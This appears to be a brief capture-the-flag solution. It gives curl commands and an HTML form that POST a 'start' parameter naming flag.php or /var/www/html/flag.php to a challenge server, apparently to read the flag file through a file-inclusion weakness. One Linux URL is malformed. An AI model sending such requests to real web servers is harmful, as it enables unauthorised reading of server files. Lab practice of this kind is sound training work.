PowerShell:
curl.exe -X POST -d "start=flag.php" "http://34.159.183.17:31912/?start="
Linux:
curl 'http://http://34.159.183.17:31912//?start=' --data 'start=flag.php'

html:
<form action="http://34.179.142.63:32630?start=1" method="POST">
    <input name="start" value="/var/www/html/flag.php">
    <button>Submit</button>
</form>
